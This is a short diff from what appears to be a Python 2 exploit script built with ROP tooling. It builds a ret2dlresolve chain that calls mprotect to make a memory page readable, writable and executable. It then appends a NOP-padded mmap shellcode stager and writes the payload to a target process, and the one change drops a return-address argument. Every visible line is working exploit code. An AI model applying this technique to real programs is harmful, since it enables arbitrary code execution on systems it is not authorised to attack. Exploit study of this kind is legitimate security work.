@@ -15,7 +15,7 @@ p = Proc(rop.fpath)
 p.write(p32(len(buf)) + buf)
 print "[+] read: %r" % p.read(len(buf))
 
-buf = rop.dl_resolve(addr_stage, 'mprotect', addr_stage & ~0xFFF, 0x1000, 7, retaddr=addr_stage+100)
+buf = rop.dl_resolve(addr_stage, 'mprotect', addr_stage & ~0xFFF, 0x1000, 7)
 buf += sc.nopfill('mmap_stager', 200, buf)
 
 p.write(buf)
